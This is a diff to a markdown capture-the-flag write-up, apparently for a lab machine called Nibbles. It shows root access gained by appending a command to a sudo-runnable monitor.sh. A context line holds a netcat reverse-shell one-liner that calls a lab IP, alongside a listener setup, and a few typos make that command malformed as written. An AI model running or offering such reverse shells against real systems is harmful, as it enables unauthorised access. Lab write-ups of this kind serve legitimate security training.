@@ -64,6 +64,7 @@ After that we fired it up.
 
 Somebody left the flag after exploiting the monitor.sh in the /tmp/ folder, but I wanted to get it for real myself.
 I found a zip within home/nibbler with a monitor.sh in it.
+To de-zip, or execute files you always have to call the `shell` first.
 
 ![1ctf](https://i.imgur.com/HfUWxlj.png)
 
@@ -71,7 +72,7 @@ After that I did set up a nc listener on post 2491 and added following command i
 
 `echp "rm/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.XXX 2491 >/tmp/f" >> monitor.sh`
 
-Thank you for that command @sicurolab.
+Thank you for that command @sicurolab.´
 
 ![2ctf](https://i.imgur.com/ANHg0Jv.png)
 
@@ -80,6 +81,7 @@ We then execute the monitor.sh file with /usr/bin/sudo and receive our root shel
 ![3ctf](https://i.imgur.com/J05iDMS.png)
 
 `cat root.txt` - system flag captured!
+`cat /home/nibbles/user.txt` - user flag captured!
 
 ## 8. Cleanup
  
